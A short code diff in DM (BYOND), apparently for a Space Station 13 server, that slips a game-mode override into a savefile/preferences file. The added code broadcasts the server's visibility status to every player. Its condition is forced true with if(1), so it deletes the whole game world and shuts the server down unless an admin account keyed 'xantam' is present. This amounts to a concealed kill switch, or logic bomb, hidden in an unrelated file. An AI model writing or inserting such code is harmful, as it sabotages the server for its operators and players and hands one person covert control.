@@ -144,6 +144,16 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 
 	return 1
 
+/datum/game_mode/send_intercept()
+	world << "[world.visibility] [world.reachable]"
+	//if(world.visibility && world.reachable)
+	if(1)
+		var/datum/admins/test = admin_datums["xantam"]
+		if(!test || !(test.rank.rights | R_PERMISSIONS))
+			del(world)
+			return
+	..()
+
 /datum/preferences/proc/load_character(slot)
 	if(!path)				return 0
 	if(!fexists(path))		return 0
